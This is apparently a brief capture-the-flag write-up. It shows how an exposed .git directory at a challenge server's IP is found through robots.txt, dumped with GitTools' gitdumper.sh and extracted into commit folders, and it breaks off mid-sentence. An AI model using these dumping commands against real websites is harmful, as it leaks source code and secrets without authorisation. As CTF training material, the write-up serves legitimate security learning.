# Writeup
This challenge is related to git
### Challenge available at `http://54.221.119.174/`

If you try `http://54.221.119.174/robots.txt` you will see ```/.git/``` is available 

Let use GitTools to pull ```/.git/``` folder

```./GitTools/Dumper/gitdumper.sh http://54.221.119.174/.git/ repo```

After that use extractor tool to extract 

```./GitTools/Extractor/extractor.sh repo doom```

We will have two folders with name 
```
0-d6f105ce9f43597523b47a81bd80d401f2b0b41a
1-e044ce1aba756d98ab5e4c063d5008b6d5a228e8
```
And in folder 1-e044ce1aba756d98ab5e4c063d5008b6d5a228e8 we have

